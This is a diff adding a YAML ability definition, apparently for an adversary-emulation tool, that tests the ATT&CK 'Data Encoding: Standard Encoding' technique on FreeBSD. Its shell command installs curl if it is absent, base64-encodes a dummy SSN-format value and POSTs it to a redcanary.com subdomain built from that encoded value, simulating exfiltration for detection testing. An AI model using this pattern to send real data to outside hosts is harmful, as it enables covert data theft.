@@ -1,0 +1,17 @@
+---
+- id: 61b95a301ba6041fd362f24da535c724
+  name: Base64 Encoded data (freebsd)
+  description: 'Utilizing a common technique for posting base64 encoded data.
+
+    '
+  tactic: command-and-control
+  technique:
+    attack_id: T1132.001
+    name: 'Data Encoding: Standard Encoding'
+  platforms:
+    linux:
+      sh:
+        command: 'if [ -x "$(command -v curl)" ]; then : ; else pkg install -y curl;
+          fi;  echo -n 111-11-1111 | b64encode -r -; curl -XPOST MTExLTExLTExMTE=.redcanary.com'
+        payloads: []
+        cleanup: ''
